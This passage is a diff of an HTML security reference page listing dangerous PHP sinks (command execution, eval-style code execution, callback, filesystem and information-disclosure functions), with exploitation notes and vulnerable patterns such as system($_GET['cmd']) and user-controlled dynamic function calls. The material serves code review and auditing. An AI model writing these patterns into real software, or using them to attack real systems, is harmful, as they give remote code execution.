-</span></span><span class="line"><span class="cl"><span class="nv">$func</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ReflectionFunction</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;func_name&#39;</span><span class="p">]);</span> <span class="nv">$func</span><span class="o">-&gt;</span><span class="na">invoke</span><span class="p">();</span> <span class="k">or</span> <span class="nv">$func</span><span class="o">-&gt;</span><span class="na">invokeArgs</span><span class="p">(</span><span class="k">array</span><span class="p">());</span>
-</span></span></code></pre></div><h2 id="list-of-functions-which-accept-callbacks">List of functions which accept callbacks<a hidden class="anchor" aria-hidden="true" href="#list-of-functions-which-accept-callbacks">#</a></h2>
-<p>These functions accept a string parameter which could be used to call a function of the attacker&rsquo;s choice. Depending on the function the attacker may or may not have the ability to pass a parameter. In that case an Information Disclosure function like <code>phpinfo()</code> could be used.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">Function</span>                     <span class="o">=&gt;</span> <span class="nx">Position</span> <span class="nx">of</span> <span class="nx">callback</span> <span class="nx">arguments</span>
-</span></span><span class="line"><span class="cl"><span class="s1">&#39;ob_start&#39;</span>                   <span class="o">=&gt;</span>  <span class="mi">0</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl"><span class="s1">&#39;array_diff_uassoc&#39;</span>          <span class="o">=&gt;</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl"><span class="s1">&#39;array_diff_ukey&#39;</span>            <span class="o">=&gt;</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl"><span class="s1">&#39;array_filter&#39;</span>               <span class="o">=&gt;</span>  <span class="mi">1</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl"><span class="s1">&#39;array_intersect_uassoc&#39;</span>     <span class="o">=&gt;</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl"><span class="s1">&#39;array_intersect_ukey&#39;</span>       <span class="o">=&gt;</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl"><span class="s1">&#39;array_map&#39;</span>                  <span class="o">=&gt;</span>  <span class="mi">0</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl"><span class="s1">&#39;array_reduce&#39;</span>               <span class="o">=&gt;</span>  <span class="mi">1</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl"><span class="s1">&#39;array_udiff_assoc&#39;</span>          <span class="o">=&gt;</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl"><span class="s1">&#39;array_udiff_uassoc&#39;</span>         <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">2</span><span class="p">),</span>
-</span></span><span class="line"><span class="cl"><span class="s1">&#39;array_udiff&#39;</span>                <span class="o">=&gt;</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl"><span class="s1">&#39;array_uintersect_assoc&#39;</span>     <span class="o">=&gt;</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl"><span class="s1">&#39;array_uintersect_uassoc&#39;</span>    <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">2</span><span class="p">),</span>
-</span></span><span class="line"><span class="cl"><span class="s1">&#39;array_uintersect&#39;</span>           <span class="o">=&gt;</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl"><span class="s1">&#39;array_walk_recursive&#39;</span>       <span class="o">=&gt;</span>  <span class="mi">1</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl"><span class="s1">&#39;array_walk&#39;</span>                 <span class="o">=&gt;</span>  <span class="mi">1</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl"><span class="s1">&#39;assert_options&#39;</span>             <span class="o">=&gt;</span>  <span class="mi">1</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl"><span class="s1">&#39;uasort&#39;</span>                     <span class="o">=&gt;</span>  <span class="mi">1</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl"><span class="s1">&#39;uksort&#39;</span>                     <span class="o">=&gt;</span>  <span class="mi">1</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl"><span class="s1">&#39;usort&#39;</span>                      <span class="o">=&gt;</span>  <span class="mi">1</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl"><span class="s1">&#39;preg_replace_callback&#39;</span>      <span class="o">=&gt;</span>  <span class="mi">1</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl"><span class="s1">&#39;spl_autoload_register&#39;</span>      <span class="o">=&gt;</span>  <span class="mi">0</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl"><span class="s1">&#39;iterator_apply&#39;</span>             <span class="o">=&gt;</span>  <span class="mi">1</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl"><span class="s1">&#39;call_user_func&#39;</span>             <span class="o">=&gt;</span>  <span class="mi">0</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl"><span class="s1">&#39;call_user_func_array&#39;</span>       <span class="o">=&gt;</span>  <span class="mi">0</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl"><span class="s1">&#39;register_shutdown_function&#39;</span> <span class="o">=&gt;</span>  <span class="mi">0</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl"><span class="s1">&#39;register_tick_function&#39;</span>     <span class="o">=&gt;</span>  <span class="mi">0</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl"><span class="s1">&#39;set_error_handler&#39;</span>          <span class="o">=&gt;</span>  <span class="mi">0</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl"><span class="s1">&#39;set_exception_handler&#39;</span>      <span class="o">=&gt;</span>  <span class="mi">0</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl"><span class="s1">&#39;session_set_save_handler&#39;</span>   <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">),</span>
-</span></span><span class="line"><span class="cl"><span class="s1">&#39;sqlite_create_aggregate&#39;</span>    <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">),</span>
-</span></span><span class="line"><span class="cl"><span class="s1">&#39;sqlite_create_function&#39;</span>     <span class="o">=&gt;</span>  <span class="mi">2</span><span class="p">,</span>
-</span></span></code></pre></div><h2 id="information-disclosure">Information Disclosure<a hidden class="anchor" aria-hidden="true" href="#information-disclosure">#</a></h2>
-<p>Most of these function calls are not sinks. But rather it maybe a vulnerability if any of the data returned is viewable to an attacker. If an attacker can see <code>phpinfo()</code> it is definitely a vulnerability.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">phpinfo</span>
-</span></span><span class="line"><span class="cl"><span class="nx">posix_mkfifo</span>
-</span></span><span class="line"><span class="cl"><span class="nx">posix_getlogin</span>
-</span></span><span class="line"><span class="cl"><span class="nx">posix_ttyname</span>
-</span></span><span class="line"><span class="cl"><span class="nx">getenv</span>
-</span></span><span class="line"><span class="cl"><span class="nx">get_current_user</span>
-</span></span><span class="line"><span class="cl"><span class="nx">proc_get_status</span>
-</span></span><span class="line"><span class="cl"><span class="nx">get_cfg_var</span>
-</span></span><span class="line"><span class="cl"><span class="nx">disk_free_space</span>
-</span></span><span class="line"><span class="cl"><span class="nx">disk_total_space</span>
-</span></span><span class="line"><span class="cl"><span class="nx">diskfreespace</span>
-</span></span><span class="line"><span class="cl"><span class="nx">getcwd</span>
-</span></span><span class="line"><span class="cl"><span class="nx">getlastmo</span>
-</span></span><span class="line"><span class="cl"><span class="nx">getmygid</span>
-</span></span><span class="line"><span class="cl"><span class="nx">getmyinode</span>
-</span></span><span class="line"><span class="cl"><span class="nx">getmypid</span>
-</span></span><span class="line"><span class="cl"><span class="nx">getmyuid</span>
-</span></span></code></pre></div><h2 id="other">Other<a hidden class="anchor" aria-hidden="true" href="#other">#</a></h2>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">extract</span> <span class="o">-</span> <span class="nx">Opens</span> <span class="nx">the</span> <span class="nx">door</span> <span class="k">for</span> <span class="nx">register_globals</span> <span class="nx">attacks</span> <span class="p">(</span><span class="nx">see</span> <span class="p">[</span><span class="nx">study</span> <span class="nx">in</span> <span class="nx">scarlet</span> <span class="o">-</span> <span class="nx">seclist</span><span class="p">](</span><span class="nx">http</span><span class="o">://</span><span class="nx">seclists</span><span class="o">.</span><span class="nx">org</span><span class="o">/</span><span class="nx">bugtraq</span><span class="o">/</span><span class="mi">2001</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="nx">att</span><span class="o">-</span><span class="mi">26</span><span class="o">/</span><span class="nx">studyinscarlet</span><span class="o">.</span><span class="nx">txt</span><span class="p">))</span><span class="o">.</span>
-</span></span><span class="line"><span class="cl"><span class="nx">parse_str</span> <span class="o">-</span>  <span class="nx">works</span> <span class="nx">like</span> <span class="nx">extract</span> <span class="k">if</span> <span class="nx">only</span> <span class="nx">one</span> <span class="nx">argument</span> <span class="nx">is</span> <span class="nx">given</span><span class="o">.</span>
-</span></span><span class="line"><span class="cl"><span class="nx">putenv</span>
-</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span>
-</span></span><span class="line"><span class="cl"><span class="nx">mail</span> <span class="o">-</span> <span class="nx">has</span> <span class="nx">CRLF</span> <span class="nx">injection</span> <span class="nx">in</span> <span class="nx">the</span> <span class="mi">3</span><span class="nx">rd</span> <span class="nx">parameter</span><span class="p">,</span> <span class="nx">opens</span> <span class="nx">the</span> <span class="nx">door</span> <span class="k">for</span> <span class="nx">spam</span><span class="o">.</span> 
-</span></span><span class="line"><span class="cl"><span class="nx">header</span> <span class="o">-</span> <span class="nx">on</span> <span class="nx">old</span> <span class="nx">systems</span> <span class="nx">CRLF</span> <span class="nx">injection</span> <span class="nx">could</span> <span class="nx">be</span> <span class="nx">used</span> <span class="k">for</span> <span class="nx">xss</span> <span class="k">or</span> <span class="nx">other</span> <span class="nx">purposes</span><span class="p">,</span> <span class="nx">now</span> <span class="nx">it</span> <span class="nx">is</span> <span class="nx">still</span> <span class="nx">a</span> <span class="nx">problem</span> <span class="k">if</span> <span class="nx">they</span> <span class="k">do</span> <span class="nx">a</span> <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;location: ...&#34;</span><span class="p">);</span> <span class="k">and</span> <span class="nx">they</span> <span class="k">do</span> <span class="k">not</span> <span class="k">die</span><span class="p">();</span><span class="o">.</span> <span class="nx">The</span> <span class="nx">script</span> <span class="nx">keeps</span> <span class="nx">executing</span> <span class="nx">after</span> <span class="nx">a</span> <span class="nx">call</span> <span class="nx">to</span> <span class="nx">header</span><span class="p">(),</span> <span class="k">and</span> <span class="nx">will</span> <span class="nx">still</span> <span class="k">print</span> <span class="nx">output</span> <span class="nx">normally</span><span class="o">.</span> <span class="k">This</span> <span class="nx">is</span> <span class="nx">nasty</span> <span class="k">if</span> <span class="nx">you</span> <span class="nx">are</span> <span class="nx">trying</span> <span class="nx">to</span> <span class="nx">protect</span> <span class="nx">an</span> <span class="nx">administrative</span> <span class="nx">area</span><span class="o">.</span> 
-</span></span><span class="line"><span class="cl"><span class="nx">proc_nice</span>
-</span></span><span class="line"><span class="cl"><span class="nx">proc_terminate</span>
-</span></span><span class="line"><span class="cl"><span class="nx">proc_close</span>
-</span></span><span class="line"><span class="cl"><span class="nx">pfsockopen</span>
-</span></span><span class="line"><span class="cl"><span class="nx">fsockopen</span>
-</span></span><span class="line"><span class="cl"><span class="nx">apache_child_terminate</span>
-</span></span><span class="line"><span class="cl"><span class="nx">posix_kill</span>
-</span></span><span class="line"><span class="cl"><span class="nx">posix_mkfifo</span>
-</span></span><span class="line"><span class="cl"><span class="nx">posix_setpgid</span>
-</span></span><span class="line"><span class="cl"><span class="nx">posix_setsid</span>
-</span></span><span class="line"><span class="cl"><span class="nx">posix_setuid</span>
-</span></span></code></pre></div><h2 id="filesystem-functions">Filesystem Functions<a hidden class="anchor" aria-hidden="true" href="#filesystem-functions">#</a></h2>
-<p>According to RATS all filesystem functions in php are nasty. Some of these don&rsquo;t seem very useful to the attacker. Others are more useful than you might think. For instance if <code>allow_url_fopen=On</code> then a url can be used as a file path, so a call to <code>copy($_GET['s'], $_GET['d']);</code> can be used to upload a PHP script anywhere on the system. Also if a site is vulnerable to a request send via GET everyone of those file system functions can be abused to channel and attack to another host through your server.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// open filesystem handler
-</span></span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nx">fopen</span>
-</span></span><span class="line"><span class="cl"><span class="nx">tmpfile</span>
-</span></span><span class="line"><span class="cl"><span class="nx">bzopen</span>
-</span></span><span class="line"><span class="cl"><span class="nx">gzopen</span>
-</span></span><span class="line"><span class="cl"><span class="nx">SplFileObject</span><span class="o">-&gt;</span><span class="na">__construct</span>
+<p>Direct OS command execution. If any of these receive unsanitised user input, it is RCE.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">exec</span><span class="p">()</span>           <span class="c1">// Returns last line of output — no direct output to browser
+</span></span></span><span class="line"><span class="cl"><span class="nx">passthru</span><span class="p">()</span>       <span class="c1">// Passes raw output directly to browser — useful for binary output
+</span></span></span><span class="line"><span class="cl"><span class="nx">system</span><span class="p">()</span>         <span class="c1">// Passes output to browser AND returns last line
+</span></span></span><span class="line"><span class="cl"><span class="nx">shell_exec</span><span class="p">()</span>     <span class="c1">// Returns entire output as a string
+</span></span></span><span class="line"><span class="cl"><span class="sb">``</span>               <span class="c1">// Backtick operator — identical to shell_exec()
+</span></span></span><span class="line"><span class="cl"><span class="nx">popen</span><span class="p">()</span>          <span class="c1">// Opens a pipe to a process — read or write
+</span></span></span><span class="line"><span class="cl"><span class="nx">proc_open</span><span class="p">()</span>      <span class="c1">// Like popen() but with more control over stdin/stdout/stderr
+</span></span></span><span class="line"><span class="cl"><span class="nx">pcntl_exec</span><span class="p">()</span>     <span class="c1">// Executes a program, replacing current process
+</span></span></span></code></pre></div><p><strong>PHP version notes:</strong></p>
+<ul>
+<li>All functions above exist in PHP 5, 7, and 8</li>
+<li><code>pcntl_exec()</code> requires the <code>pcntl</code> extension — not enabled by default on Windows</li>
+</ul>
+<p><strong>Exploitation context:</strong>
+If you find <code>system($_GET['cmd'])</code> or similar, you have immediate RCE. Look for user input flowing into any of these via variable assignment, string concatenation, or function return values.</p>
+<hr>
+<h2 id="php-code-execution">PHP Code Execution<a hidden class="anchor" aria-hidden="true" href="#php-code-execution">#</a></h2>
+<p>These functions evaluate PHP code at runtime. User input reaching these = RCE.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">eval</span><span class="p">()</span>                              <span class="c1">// Executes string as PHP code
+</span></span></span><span class="line"><span class="cl"><span class="nx">assert</span><span class="p">()</span>                            <span class="c1">// In PHP &lt; 8: identical to eval() when passed a string
+</span></span></span><span class="line"><span class="cl"><span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/.*/e&#39;</span><span class="p">,</span> <span class="nv">$input</span><span class="p">,</span> <span class="o">...</span><span class="p">)</span> <span class="c1">// /e modifier evals the replacement — REMOVED in PHP 7.0
+</span></span></span><span class="line"><span class="cl"><span class="nx">create_function</span><span class="p">()</span>                   <span class="c1">// Creates anonymous function via eval — REMOVED in PHP 8.0
+</span></span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="nv">$input</span><span class="p">)</span>                     <span class="c1">// Executes included file as PHP — LFI/RFI if user-controlled
+</span></span></span><span class="line"><span class="cl"><span class="k">include_once</span><span class="p">(</span><span class="nv">$input</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">require</span><span class="p">(</span><span class="nv">$input</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">require_once</span><span class="p">(</span><span class="nv">$input</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;func_name&#39;</span><span class="p">](</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;argument&#39;</span><span class="p">])</span>  <span class="c1">// Dynamic function call — common in poorly written apps
+</span></span></span><span class="line"><span class="cl"><span class="nv">$func</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ReflectionFunction</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;func_name&#39;</span><span class="p">]);</span> <span class="nv">$func</span><span class="o">-&gt;</span><span class="na">invoke</span><span class="p">();</span>
+</span></span></code></pre></div><p><strong>PHP version compatibility:</strong></p>
+<table>
+  <thead>
+      <tr>
+          <th>Function</th>
+          <th>PHP 5</th>
+          <th>PHP 7</th>
+          <th>PHP 8</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>eval()</code></td>
+          <td>yes</td>
+          <td>yes</td>
+          <td>yes</td>
+      </tr>
+      <tr>
+          <td><code>assert()</code> as eval</td>
+          <td>yes</td>
+          <td>deprecated</td>
+          <td>removed</td>
+      </tr>
+      <tr>
+          <td><code>preg_replace /e</code></td>
+          <td>yes</td>
+          <td>removed in 7.0</td>
+          <td>no</td>
+      </tr>
+      <tr>
+          <td><code>create_function()</code></td>
+          <td>yes</td>
+          <td>deprecated</td>
+          <td>removed in 8.0</td>
+      </tr>
+  </tbody>
+</table>
+<p><strong>Exploitation context:</strong>
+<code>assert()</code> deserves special attention — in PHP 5 and early PHP 7, passing a string to <code>assert()</code> evaluates it as PHP code. This is frequently missed in code review because developers use it for debugging. Look for <code>assert($input)</code> with any user-controlled <code>$input</code>.</p>
+<hr>
+<h2 id="callback-functions">Callback Functions<a hidden class="anchor" aria-hidden="true" href="#callback-functions">#</a></h2>
+<p>These functions accept a callable as a parameter. If the callable is user-controlled, it can be used to call arbitrary functions including <code>phpinfo()</code>, <code>system()</code>, or <code>eval()</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// Common callback sinks
+</span></span></span><span class="line"><span class="cl"><span class="nx">call_user_func</span><span class="p">(</span><span class="nv">$callback</span><span class="p">,</span> <span class="nv">$arg</span><span class="p">)</span>        <span class="c1">// Calls $callback with $arg
+</span></span></span><span class="line"><span class="cl"><span class="nx">call_user_func_array</span><span class="p">(</span><span class="nv">$callback</span><span class="p">,</span> <span class="nv">$args</span><span class="p">)</span> <span class="c1">// Calls $callback with array of args
+</span></span></span><span class="line"><span class="cl"><span class="nx">array_map</span><span class="p">(</span><span class="nv">$callback</span><span class="p">,</span> <span class="nv">$array</span><span class="p">)</span>           <span class="c1">// Applies $callback to each element
+</span></span></span><span class="line"><span class="cl"><span class="nx">array_filter</span><span class="p">(</span><span class="nv">$array</span><span class="p">,</span> <span class="nv">$callback</span><span class="p">)</span>        <span class="c1">// Filters using $callback
+</span></span></span><span class="line"><span class="cl"><span class="nx">usort</span><span class="p">(</span><span class="nv">$array</span><span class="p">,</span> <span class="nv">$callback</span><span class="p">)</span>               <span class="c1">// Sorts using $callback comparator
+</span></span></span><span class="line"><span class="cl"><span class="nx">uasort</span><span class="p">(</span><span class="nv">$array</span><span class="p">,</span> <span class="nv">$callback</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">uksort</span><span class="p">(</span><span class="nv">$array</span><span class="p">,</span> <span class="nv">$callback</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">preg_replace_callback</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">,</span> <span class="nv">$callback</span><span class="p">,</span> <span class="nv">$subject</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">array_walk</span><span class="p">(</span><span class="nv">$array</span><span class="p">,</span> <span class="nv">$callback</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">array_walk_recursive</span><span class="p">(</span><span class="nv">$array</span><span class="p">,</span> <span class="nv">$callback</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">// write to filesystem (partially in combination with reading)
-</span></span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nx">chgrp</span>
-</span></span><span class="line"><span class="cl"><span class="nx">chmod</span>
-</span></span><span class="line"><span class="cl"><span class="nx">chown</span>
-</span></span><span class="line"><span class="cl"><span class="nx">copy</span>
-</span></span><span class="line"><span class="cl"><span class="nx">file_put_contents</span>
-</span></span><span class="line"><span class="cl"><span class="nx">lchgrp</span>
-</span></span><span class="line"><span class="cl"><span class="nx">lchown</span>
-</span></span><span class="line"><span class="cl"><span class="nx">link</span>
-</span></span><span class="line"><span class="cl"><span class="nx">mkdir</span>
-</span></span><span class="line"><span class="cl"><span class="nx">move_uploaded_file</span>
-</span></span><span class="line"><span class="cl"><span class="nx">rename</span>
-</span></span><span class="line"><span class="cl"><span class="nx">rmdir</span>
-</span></span><span class="line"><span class="cl"><span class="nx">symlink</span>
-</span></span><span class="line"><span class="cl"><span class="nx">tempnam</span>
-</span></span><span class="line"><span class="cl"><span class="nx">touch</span>
-</span></span><span class="line"><span class="cl"><span class="nx">unlink</span>
-</span></span><span class="line"><span class="cl"><span class="nx">imagepng</span>   <span class="o">-</span> <span class="mi">2</span><span class="nx">nd</span> <span class="nx">parameter</span> <span class="nx">is</span> <span class="nx">a</span> <span class="nx">path</span><span class="o">.</span>
-</span></span><span class="line"><span class="cl"><span class="nx">imagewbmp</span>  <span class="o">-</span> <span class="mi">2</span><span class="nx">nd</span> <span class="nx">parameter</span> <span class="nx">is</span> <span class="nx">a</span> <span class="nx">path</span><span class="o">.</span> 
-</span></span><span class="line"><span class="cl"><span class="nx">image2wbmp</span> <span class="o">-</span> <span class="mi">2</span><span class="nx">nd</span> <span class="nx">parameter</span> <span class="nx">is</span> <span class="nx">a</span> <span class="nx">path</span><span class="o">.</span> 
-</span></span><span class="line"><span class="cl"><span class="nx">imagejpeg</span>  <span class="o">-</span> <span class="mi">2</span><span class="nx">nd</span> <span class="nx">parameter</span> <span class="nx">is</span> <span class="nx">a</span> <span class="nx">path</span><span class="o">.</span>
-</span></span><span class="line"><span class="cl"><span class="nx">imagexbm</span>   <span class="o">-</span> <span class="mi">2</span><span class="nx">nd</span> <span class="nx">parameter</span> <span class="nx">is</span> <span class="nx">a</span> <span class="nx">path</span><span class="o">.</span>
-</span></span><span class="line"><span class="cl"><span class="nx">imagegif</span>   <span class="o">-</span> <span class="mi">2</span><span class="nx">nd</span> <span class="nx">parameter</span> <span class="nx">is</span> <span class="nx">a</span> <span class="nx">path</span><span class="o">.</span>
-</span></span><span class="line"><span class="cl"><span class="nx">imagegd</span>    <span class="o">-</span> <span class="mi">2</span><span class="nx">nd</span> <span class="nx">parameter</span> <span class="nx">is</span> <span class="nx">a</span> <span class="nx">path</span><span class="o">.</span>
-</span></span><span class="line"><span class="cl"><span class="nx">imagegd2</span>   <span class="o">-</span> <span class="mi">2</span><span class="nx">nd</span> <span class="nx">parameter</span> <span class="nx">is</span> <span class="nx">a</span> <span class="nx">path</span><span class="o">.</span>
-</span></span><span class="line"><span class="cl"><span class="nx">iptcembed</span>
-</span></span><span class="line"><span class="cl"><span class="nx">ftp_get</span>
-</span></span><span class="line"><span class="cl"><span class="nx">ftp_nb_get</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// Less obvious callback sinks
+</span></span></span><span class="line"><span class="cl"><span class="nx">ob_start</span><span class="p">(</span><span class="nv">$callback</span><span class="p">)</span>                    <span class="c1">// Output buffer handler
+</span></span></span><span class="line"><span class="cl"><span class="nx">register_shutdown_function</span><span class="p">(</span><span class="nv">$callback</span><span class="p">)</span>  <span class="c1">// Called on script termination
+</span></span></span><span class="line"><span class="cl"><span class="nx">register_tick_function</span><span class="p">(</span><span class="nv">$callback</span><span class="p">)</span>      <span class="c1">// Called on each tick
+</span></span></span><span class="line"><span class="cl"><span class="nx">set_error_handler</span><span class="p">(</span><span class="nv">$callback</span><span class="p">)</span>           <span class="c1">// Custom error handler
+</span></span></span><span class="line"><span class="cl"><span class="nx">set_exception_handler</span><span class="p">(</span><span class="nv">$callback</span><span class="p">)</span>       <span class="c1">// Custom exception handler
+</span></span></span><span class="line"><span class="cl"><span class="nx">spl_autoload_register</span><span class="p">(</span><span class="nv">$callback</span><span class="p">)</span>       <span class="c1">// Autoloader registration
+</span></span></span><span class="line"><span class="cl"><span class="nx">iterator_apply</span><span class="p">(</span><span class="nv">$iterator</span><span class="p">,</span> <span class="nv">$callback</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">// read from filesystem
-</span></span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nx">file_exists</span>
-</span></span><span class="line"><span class="cl"><span class="nx">file_get_contents</span>
-</span></span><span class="line"><span class="cl"><span class="nx">file</span>
-</span></span><span class="line"><span class="cl"><span class="nx">fileatime</span>
-</span></span><span class="line"><span class="cl"><span class="nx">filectime</span>
-</span></span><span class="line"><span class="cl"><span class="nx">filegroup</span>
-</span></span><span class="line"><span class="cl"><span class="nx">fileinode</span>
-</span></span><span class="line"><span class="cl"><span class="nx">filemtime</span>
-</span></span><span class="line"><span class="cl"><span class="nx">fileowner</span>
-</span></span><span class="line"><span class="cl"><span class="nx">fileperms</span>
-</span></span><span class="line"><span class="cl"><span class="nx">filesize</span>
-</span></span><span class="line"><span class="cl"><span class="nx">filetype</span>
-</span></span><span class="line"><span class="cl"><span class="nx">glob</span>
-</span></span><span class="line"><span class="cl"><span class="nx">is_dir</span>
-</span></span><span class="line"><span class="cl"><span class="nx">is_executable</span>
-</span></span><span class="line"><span class="cl"><span class="nx">is_file</span>
-</span></span><span class="line"><span class="cl"><span class="nx">is_link</span>
-</span></span><span class="line"><span class="cl"><span class="nx">is_readable</span>
-</span></span><span class="line"><span class="cl"><span class="nx">is_uploaded_file</span>
-</span></span><span class="line"><span class="cl"><span class="nx">is_writable</span>
-</span></span><span class="line"><span class="cl"><span class="nx">is_writeable</span>
-</span></span><span class="line"><span class="cl"><span class="nx">linkinfo</span>
-</span></span><span class="line"><span class="cl"><span class="nx">lstat</span>
-</span></span><span class="line"><span class="cl"><span class="nx">parse_ini_file</span>
-</span></span><span class="line"><span class="cl"><span class="nx">pathinfo</span>
-</span></span><span class="line"><span class="cl"><span class="nx">readfile</span>
-</span></span><span class="line"><span class="cl"><span class="nx">readlink</span>
-</span></span><span class="line"><span class="cl"><span class="nx">realpath</span>
-</span></span><span class="line"><span class="cl"><span class="nx">stat</span>
-</span></span><span class="line"><span class="cl"><span class="nx">gzfile</span>
-</span></span><span class="line"><span class="cl"><span class="nx">readgzfile</span>
-</span></span><span class="line"><span class="cl"><span class="nx">getimagesize</span>
-</span></span><span class="line"><span class="cl"><span class="nx">imagecreatefromgif</span>
-</span></span><span class="line"><span class="cl"><span class="nx">imagecreatefromjpeg</span>
-</span></span><span class="line"><span class="cl"><span class="nx">imagecreatefrompng</span>
-</span></span><span class="line"><span class="cl"><span class="nx">imagecreatefromwbmp</span>
-</span></span><span class="line"><span class="cl"><span class="nx">imagecreatefromxbm</span>
-</span></span><span class="line"><span class="cl"><span class="nx">imagecreatefromxpm</span>
-</span></span><span class="line"><span class="cl"><span class="nx">ftp_put</span>
-</span></span><span class="line"><span class="cl"><span class="nx">ftp_nb_put</span>
-</span></span><span class="line"><span class="cl"><span class="nx">exif_read_data</span>
-</span></span><span class="line"><span class="cl"><span class="nx">read_exif_data</span>
-</span></span><span class="line"><span class="cl"><span class="nx">exif_thumbnail</span>
-</span></span><span class="line"><span class="cl"><span class="nx">exif_imagetype</span>
-</span></span><span class="line"><span class="cl"><span class="nx">hash_file</span>
-</span></span><span class="line"><span class="cl"><span class="nx">hash_hmac_file</span>
-</span></span><span class="line"><span class="cl"><span class="nx">hash_update_file</span>
-</span></span><span class="line"><span class="cl"><span class="nx">md5_file</span>
-</span></span><span class="line"><span class="cl"><span class="nx">sha1_file</span>
-</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span>
-</span></span><span class="line"><span class="cl"><span class="nx">show_source</span>
-</span></span><span class="line"><span class="cl"><span class="nx">php_strip_whitespace</span>
-</span></span><span class="line"><span class="cl"><span class="nx">get_meta_tags</span>
-</span></span></code></pre></div><ul>
-<li>Reference - <a href="https://stackoverflow.com/a/3697776">https://stackoverflow.com/a/3697776</a></li>
+</span></span><span class="line"><span class="cl"><span class="c1">// Callback argument positions (for manual analysis)
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;ob_start&#39;</span>                   <span class="o">=&gt;</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;array_filter&#39;</span>               <span class="o">=&gt;</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;array_map&#39;</span>                  <span class="o">=&gt;</span> <span class="mi">0</span>
